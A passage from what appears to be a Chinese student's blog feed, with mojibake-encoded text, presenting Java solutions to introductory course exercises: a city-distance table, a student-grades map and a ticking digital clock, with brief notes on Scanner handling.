<h2 id="è¾“å‡ºæ ¼å¼ï¼š"><a href="#è¾“å‡ºæ ¼å¼ï¼š" class="headerlink" title="è¾“å‡ºæ ¼å¼ï¼š"></a>è¾“å‡ºæ ¼å¼ï¼š</h2><p>è¾“å‡ºè¿™ä¸¤ä¸ªåŸå¸‚ä¹‹é—´çš„è·ç¦»ã€‚</p>
<h2 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h2><div class="note default no-icon"><p>Hagzou Hugzou Jigxng ###
0 1108 708
1108 0 994
708 994 0
Hagzou Jigxng
</p></div>

<h2 id="è¾“å‡ºæ ·ä¾‹ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h2><div class="note default no-icon"><p>708
</p></div>

<p><strong>æ—¶é—´é™åˆ¶ï¼š500mså†…å­˜é™åˆ¶ï¼š32000kb</strong></p>
<h2 id="ä»£ç ï¼š"><a href="#ä»£ç ï¼š" class="headerlink" title="ä»£ç ï¼š"></a>ä»£ç ï¼š</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡_Javaè¯­è¨€_ç¿æº;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Third_Week</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> ArrayList&lt;String&gt; city = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;String, HashMap&lt;String, Integer&gt;&gt; distince = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, HashMap&lt;String, Integer&gt;&gt;();</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// è¾“å…¥åŸå¸‚ååŠè·ç¦»</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">input</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line"><span class="comment">//		Scanner in = new Scanner(System.in);</span></span><br><span class="line">		String temp;</span><br><span class="line">		<span class="comment">// è¯»å…¥åŸå¸‚å</span></span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			temp = in.next();</span><br><span class="line">			<span class="keyword">if</span> (temp.equals(<span class="string">&quot;###&quot;</span>) == <span class="literal">true</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			city.add(temp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// è¯»å…¥è·ç¦»</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; city.size(); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			HashMap&lt;String, Integer&gt; temp_hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Integer&gt;();</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; city.size(); j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">int</span> <span class="variable">dis</span> <span class="operator">=</span> in.nextInt();</span><br><span class="line">				temp_hashmap.put(city.get(j), dis);</span><br><span class="line">			&#125;</span><br><span class="line">			distince.put(city.get(i), temp_hashmap);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">//		in.close();</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// æŸ¥æ‰¾ä¸¤ä¸ªåŸå¸‚é—´çš„è·ç¦»</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(String start, String end)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		dis = distince.get(start).get(end);</span><br><span class="line">		<span class="keyword">return</span> dis;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Third_Week</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Third_Week</span>();</span><br><span class="line"><span class="comment">//		Scanner in = new Scanner(System.in);</span></span><br><span class="line">		dis.input();</span><br><span class="line">		<span class="type">String</span> <span class="variable">start</span> <span class="operator">=</span> in.next();</span><br><span class="line">		<span class="type">String</span> <span class="variable">end</span> <span class="operator">=</span> in.next();</span><br><span class="line">		System.out.println(dis.search(start, end));</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="å°ç»“ï¼š"><a href="#å°ç»“ï¼š" class="headerlink" title="å°ç»“ï¼š"></a>å°ç»“ï¼š</h2><p>é¢˜ç›®ä¸­ç»™çš„æ ·ä¾‹æœ‰é—®é¢˜ï¼Œæœ‰çš„åœ°æ–¹å¤šäº†å‡ ä¸ªç©ºæ ¼ï¼Œå¯¼è‡´åœ¨æœ¬æœºæµ‹æ ·ä¾‹çš„æ—¶å€™ï¼Œä¸€ç›´æ— è¾“å‡ºï¼Œè°ƒè¯•äº†åŠå¤©ã€‚<br>æ‰‹æ‰“äº†æ ·ä¾‹ä¹‹åï¼Œå‘ç°è¦æŸ¥è¯¢çš„ä¸¤ä¸ªåŸå¸‚çš„åå­—æ— æ³•è¯»å…¥ï¼Œæ€€ç–‘æ˜¯scannerå…³é—­äº†ä¸¤æ¬¡çš„é—®é¢˜ï¼Œæ³¨é‡Šæ‰input()æ–¹æ³•ä¸­çš„<code>in.close()</code>ï¼Œæœç„¶ã€‚ã€‚ã€‚<br>ä½†æ˜¯åˆæœ‰ä¸ªwarningï¼Œæç¤º<code>input()</code>æ–¹æ³•ä¸­çš„inæ²¡æœ‰å…³é—­ã€‚å¼ºè¿«ç—‡ï¼ŒæŠŠscannerå†™æˆå…¨å±€çš„ï¼Œå®Œç¾è§£å†³ã€‚<br>å¼€å§‹æ²¡è¯»æ¸…é¢˜æ„ï¼Œä»¥ä¸ºè¦æŸ¥è¯¢å¤šç»„åŸå¸‚é—´çš„è·ç¦»ï¼ŒæŸ¥äº†ä¸‹Javaä¸­è¯»åˆ°æœ«å°¾çš„æ–¹æ³•ï¼Œå­¦ä¼šäº†<code>hasnext()</code>ç­‰æ–¹æ³•ã€‚<br>é“¾æ¥ï¼š<a href="http://blog.csdn.net/kejizuiqianfang/article/details/55253698">javaä¸­å…³äºåˆ¤æ–­æ–‡æœ¬æ–‡ä»¶è¯»åˆ°æ–‡ä»¶å°¾</a><br>é“¾æ¥ï¼š<a href="http://blog.csdn.net/wn1017888485/article/details/46039361">javaä½¿ç”¨ä¸¤ä¸ªscannerï¼Œå…³é—­è¾“å…¥æµ</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡_Javaè¯­è¨€_ç¿æº</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬ä¸‰å‘¨è®¨è®ºåŒº_å­¦ç”Ÿæˆç»©çš„æ•°æ®ç»“æ„</title>
    <url>/posts/13223/</url>
    <content><![CDATA[<h2 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h2><p>å¦‚æœè¦å†™ç¨‹åºè¡¨è¾¾ä¸€ä¸ªç­çº§çš„å¾ˆå¤šä¸ªå­¦ç”Ÿçš„å¾ˆå¤šé—¨è¯¾çš„æˆç»©ï¼Œåº”è¯¥å¦‚ä½•è¡¨è¾¾è¿™äº›æ•°æ®ï¼Ÿ</p>
<p>å¦‚æœæˆ‘ä»¬å¸Œæœ›é€šè¿‡å­¦ç”Ÿçš„å§“åï¼Œå¯ä»¥æ‰¾åˆ°ä»–çš„æ‰€æœ‰çš„æˆç»©ï¼Œè€Œæ¯ä¸€é—¨è¯¾çš„æˆç»©ï¼Œæ˜¯ç”±è¯¾ç¨‹åç§°å’Œåˆ†æ•°æ„æˆçš„ã€‚</p>
<p>è€Œå¦‚æœæˆ‘ä»¬è¿˜å¸Œæœ›è¿™ä¸ªç¨‹åºèƒ½æ‰¾å‡ºæŸä¸€é—¨è¯¾çš„å…¨éƒ¨å­¦ç”Ÿçš„æˆç»©åº”è¯¥æ€æ ·åšå‘¢ï¼Ÿ</p>
<p>æ³¨æ„ï¼Œå¹¶éæ‰€æœ‰çš„å­¦ç”Ÿéƒ½å‚åŠ äº†æ‰€æœ‰çš„è¯¾ç¨‹ã€‚</p>
<span id="more"></span>
<h2 id="ä»£ç ï¼š"><a href="#ä»£ç ï¼š" class="headerlink" title="ä»£ç ï¼š"></a>ä»£ç ï¼š</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student_Grade</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;String, HashMap&lt;String, Double&gt;&gt; studentInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, HashMap&lt;String, Double&gt;&gt;();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// é€šè¿‡å§“åæ·»åŠ æˆç»©</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name, String course, <span class="type">double</span> grade)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (studentInfo.containsKey(name))</span><br><span class="line">		&#123;</span><br><span class="line">			studentInfo.get(name).put(course, grade);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">			temp.put(course, grade);</span><br><span class="line">			studentInfo.put(name, temp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// é€šè¿‡å§“åæ‰¾åˆ°è¿™åå­¦ç”Ÿçš„æ‰€æœ‰æˆç»©</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getScore_name</span><span class="params">(String name)</span></span><br><span class="line">	&#123;</span><br><span class="line">		HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (k == name)</span><br><span class="line">			&#123;</span><br><span class="line">				temp = studentInfo.get(name);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> name+<span class="string">&quot; &quot;</span>+temp.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// é€šè¿‡è¯¾ç¨‹åæ‰¾åˆ°è¿™ä¸€é—¨è¯¾çš„å…¨éƒ¨å­¦ç”Ÿçš„æˆç»©</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getScore_subject</span><span class="params">(String subject)</span></span><br><span class="line">	&#123;</span><br><span class="line">		HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (studentInfo.get(k).containsKey(subject))</span><br><span class="line">			&#123;</span><br><span class="line">				temp.put(k, studentInfo.get(k).get(subject));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> subject+<span class="string">&quot;:&quot;</span>+temp.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// é‡è½½toString()æ–¹æ³•</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		String temp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span>(String k:studentInfo.keySet())</span><br><span class="line">			temp+=(k+<span class="string">&quot;:&quot;</span>+studentInfo.get(k).toString()+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Student_Grade</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student_Grade</span>();</span><br><span class="line">		student.add(<span class="string">&quot;å¼ ä¸‰&quot;</span>, <span class="string">&quot;Java&quot;</span>, <span class="number">60.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;å¼ ä¸‰&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">70.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;æå››&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">80.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;ç‹äº”&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">90.2</span>);</span><br><span class="line">		System.out.println(student.getScore_name(<span class="string">&quot;å¼ ä¸‰&quot;</span>));</span><br><span class="line">		System.out.println(student.getScore_subject(<span class="string">&quot;C++&quot;</span>));</span><br><span class="line">		System.out.println(student);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="è¿è¡Œç»“æœ"><a href="#è¿è¡Œç»“æœ" class="headerlink" title="è¿è¡Œç»“æœ:"></a>è¿è¡Œç»“æœ:</h2><p><img data-src="/images/20170821012136233.jpg"></p>
<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>èµ·åˆï¼Œä¸¤ä¸ªæŸ¥è¯¢çš„æ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºï¼Œè¿”å›å€¼æ˜¯ä¸€ä¸ªHasmap&lt;String,Doubole&gt;ã€‚</p>
<p>åæ¥åœ¨ä¸ºStudent_Gradeå†™<code>toStringï¼ˆï¼‰</code>æ–¹æ³•ä»¥ä¾¿è¾“å‡ºæ‰€æœ‰å­¦ç”Ÿçš„æ‰€æœ‰æˆç»©æ—¶ï¼Œæƒ³åˆ°å¯ä»¥åœ¨ä¸¤ä¸ªæŸ¥è¯¢çš„æ–¹æ³•ä¸­ä¸´æ—¶å»ºç«‹ä¸€ä¸ªStringï¼Œè°ƒç”¨<code>toString()</code>æ–¹æ³•ï¼Œèµ‹å€¼ç»™å®ƒï¼Œå¹¶å¯¹è¯¥å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ä½¿å¾—è¾“å‡ºæœ‰â€å§“åâ€œå’Œâ€è¯¾ç¨‹åâ€œï¼Œä¿¡æ¯æ›´å®Œæ•´ã€‚ï¼ˆå¼ºè¿«ç—‡ï¼‰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡å§“åæ‰¾åˆ°è¿™åå­¦ç”Ÿçš„æ‰€æœ‰æˆç»©</span></span><br><span class="line"><span class="keyword">public</span> HashMap&lt;String, Double&gt; <span class="title function_">getScore_name</span><span class="params">(String name)</span></span><br><span class="line">&#123;</span><br><span class="line">	HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">	<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (k == name)</span><br><span class="line">		&#123;</span><br><span class="line">			temp = studentInfo.get(name);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡è¯¾ç¨‹åæ‰¾åˆ°è¿™ä¸€é—¨è¯¾çš„å…¨éƒ¨å­¦ç”Ÿçš„æˆç»©</span></span><br><span class="line"><span class="keyword">public</span> HashMap&lt;String, Double&gt; <span class="title function_">getScore_subject</span><span class="params">(String subject)</span></span><br><span class="line">&#123;</span><br><span class="line">	HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">	<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (studentInfo.get(k).containsKey(subject))</span><br><span class="line">		&#123;</span><br><span class="line">			temp.put(k, studentInfo.get(k).get(subject));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡_Javaè¯­è¨€_ç¿æº</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬äºŒå‘¨ç¼–ç¨‹é¢˜_æœ‰ç§’è®¡æ—¶çš„æ•°å­—æ—¶é’Ÿ</title>
    <url>/posts/2173/</url>
    <content><![CDATA[<h2 id="é¢˜ç›®å†…å®¹ï¼š"><a href="#é¢˜ç›®å†…å®¹ï¼š" class="headerlink" title="é¢˜ç›®å†…å®¹ï¼š"></a>é¢˜ç›®å†…å®¹ï¼š</h2><p>&#160; &#160; &#160; &#160;è¿™ä¸€å‘¨çš„ç¼–ç¨‹é¢˜æ˜¯éœ€è¦ä½ åœ¨è¯¾ç¨‹æ‰€ç»™çš„æ—¶é’Ÿç¨‹åºçš„åŸºç¡€ä¸Šä¿®æ”¹è€Œæˆã€‚ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸ç›´æ¥ç»™ä½ æ—¶é’Ÿç¨‹åºçš„ä»£ç ï¼Œè¯·æ ¹æ®è§†é¢‘è‡ªå·±è¾“å…¥æ—¶é’Ÿç¨‹åºçš„Displayå’ŒClockç±»çš„ä»£ç ï¼Œç„¶åæ¥åšè¿™ä¸ªé¢˜ç›®ã€‚<br>&#160; &#160; &#160; &#160;æˆ‘ä»¬éœ€è¦ç»™æ—¶é’Ÿç¨‹åºåŠ ä¸Šä¸€ä¸ªè¡¨ç¤ºç§’çš„Displayï¼Œç„¶åä¸ºClockå¢åŠ ä»¥ä¸‹publicçš„æˆå‘˜å‡½æ•°ï¼š</p>
<span id="more"></span>

<p>public Clock(int hour, int minute, int second);<br>&#160; &#160; &#160; &#160;ç”¨hour, minuteå’Œsecondåˆå§‹åŒ–æ—¶é—´ã€‚<br>public void tick();<br>&#160; &#160; &#160; &#160;â€œå˜€å—’â€ä¸€ä¸‹ï¼Œæ—¶é—´èµ°1ç§’ã€‚<br>public String toString();<br>&#160; &#160; &#160; &#160;è¿”å›ä¸€ä¸ªStringçš„å€¼ï¼Œä»¥â€œhh:mm:ssâ€œçš„å½¢å¼è¡¨ç¤ºå½“å‰æ—¶é—´ã€‚è¿™é‡Œæ¯ä¸ªæ•°å€¼éƒ½å æ®ä¸¤ä½ï¼Œä¸è¶³ä¸¤ä½æ—¶è¡¥0ã€‚å¦‚â€œ00:01:22&quot;ã€‚æ³¨æ„å…¶ä¸­çš„å†’å·æ˜¯è¥¿æ–‡çš„ï¼Œä¸æ˜¯ä¸­æ–‡çš„ã€‚</p>
<p>æç¤ºï¼š<code>String.format()</code>å¯ä»¥ç”¨å’Œprintfä¸€æ ·çš„æ–¹å¼æ¥æ ¼å¼åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<p>å¦å¤–å†™ä¸€ä¸ªMainç±»ï¼Œå®ƒçš„mainå‡½æ•°ä¸ºä¸‹é¢çš„æ ·å­ï¼Œæ³¨æ„ï¼Œå¿…é¡»åŸå°ä¸åŠ¨åœ°ä½œä¸ºMainçš„mainå‡½æ•°ï¼š</p>
<div class="note default no-icon"><p>
public static void main(String[] args) {
java.util.Scanner in = new java.util.Scanner(System.in);
Clock clock = new Clock(in.nextInt(), in.nextInt(), in.nextInt());
clock.tick();
System.out.println(clock);
in.close();
}
</p></div>
<div class="note warning"><p>
æ³¨æ„ï¼åœ¨æäº¤çš„æ—¶å€™ï¼ŒæŠŠMainã€Clockå’ŒDisplayä¸‰ä¸ªç±»çš„ä»£ç åˆå¹¶åœ¨ä¸€èµ·ï¼Œå…¶ä¸­Mainç±»æ˜¯publicçš„ï¼Œè€ŒClockå’ŒDisplayç±»æ˜¯æ²¡æœ‰ä¿®é¥°ç¬¦çš„ã€‚å¦å¤–ï¼Œåƒä¸‡æ³¨æ„ç¬¬ä¸€è¡Œä¸èƒ½æœ‰packageè¯­å¥ã€‚
</p></div>
## è¾“å…¥æ ¼å¼:
é‡‡ç”¨ç»™å®šçš„mainå‡½æ•°æ— éœ€è€ƒè™‘è¾“å…¥è¾“å‡ºã€‚

<h2 id="è¾“å‡ºæ ¼å¼ï¼š"><a href="#è¾“å‡ºæ ¼å¼ï¼š" class="headerlink" title="è¾“å‡ºæ ¼å¼ï¼š"></a>è¾“å‡ºæ ¼å¼ï¼š</h2><p>é‡‡ç”¨ç»™å®šçš„mainå‡½æ•°æ— éœ€è€ƒè™‘è¾“å…¥è¾“å‡ºã€‚</p>
<h2 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h2><p>é‡‡ç”¨ç»™å®šçš„mainå‡½æ•°æ— éœ€è€ƒè™‘è¾“å…¥è¾“å‡ºã€‚</p>
<h2 id="è¾“å‡ºæ ·ä¾‹ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h2><p>é‡‡ç”¨ç»™å®šçš„mainå‡½æ•°æ— éœ€è€ƒè™‘è¾“å…¥è¾“å‡ºã€‚<br><strong>æ—¶é—´é™åˆ¶ï¼š500mså†…å­˜é™åˆ¶ï¼š32000kb</strong></p>
<h2 id="ä»£ç å¦‚ä¸‹ï¼š"><a href="#ä»£ç å¦‚ä¸‹ï¼š" class="headerlink" title="ä»£ç å¦‚ä¸‹ï¼š"></a>ä»£ç å¦‚ä¸‹ï¼š</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡_Javaè¯­è¨€_ç¿æº;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Second_Week</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		java.util.<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(System.in);</span><br><span class="line">		<span class="type">Clock</span> <span class="variable">clock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Clock</span>(in.nextInt(), in.nextInt(), in.nextInt());</span><br><span class="line">		clock.tick();</span><br><span class="line">		System.out.println(clock);</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Display</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> <span class="variable">limit</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Display</span><span class="params">(<span class="type">int</span> limit)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">		<span class="built_in">this</span>.limit = limit;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setvalue</span><span class="params">(<span class="type">int</span> value)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">this</span>.value = value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">increase</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">boolean</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">		value++;</span><br><span class="line">		<span class="keyword">if</span> (value == limit)</span><br><span class="line">		&#123;</span><br><span class="line">			value = <span class="number">0</span>;</span><br><span class="line">			temp = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getvalue</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> value;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clock</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">Display</span> <span class="variable">hour</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Display</span>(<span class="number">24</span>);</span><br><span class="line">	<span class="keyword">private</span> <span class="type">Display</span> <span class="variable">minute</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Display</span>(<span class="number">60</span>);</span><br><span class="line">	<span class="keyword">private</span> <span class="type">Display</span> <span class="variable">second</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Display</span>(<span class="number">60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Clock</span><span class="params">(<span class="type">int</span> hour, <span class="type">int</span> minute, <span class="type">int</span> second)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">this</span>.hour.setvalue(hour);</span><br><span class="line">		<span class="built_in">this</span>.minute.setvalue(minute);</span><br><span class="line">		<span class="built_in">this</span>.second.setvalue(second);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> String.format(<span class="string">&quot;%02d:%02d:%02d&quot;</span>, hour.getvalue(), minute.getvalue(), second.getvalue());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tick</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">this</span>.second.increase() == <span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">this</span>.minute.increase() == <span class="literal">true</span>)</span><br><span class="line">				<span class="built_in">this</span>.hour.increase();</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">//		System.out.println(toString());</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ²¡å†™toString()æ–¹æ³•æ—¶ï¼Œè¾“å‡ºä¸ºï¼š<br>é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡_Javaè¯­è¨€_ç¿æº.Clock@7d4991ad</p>
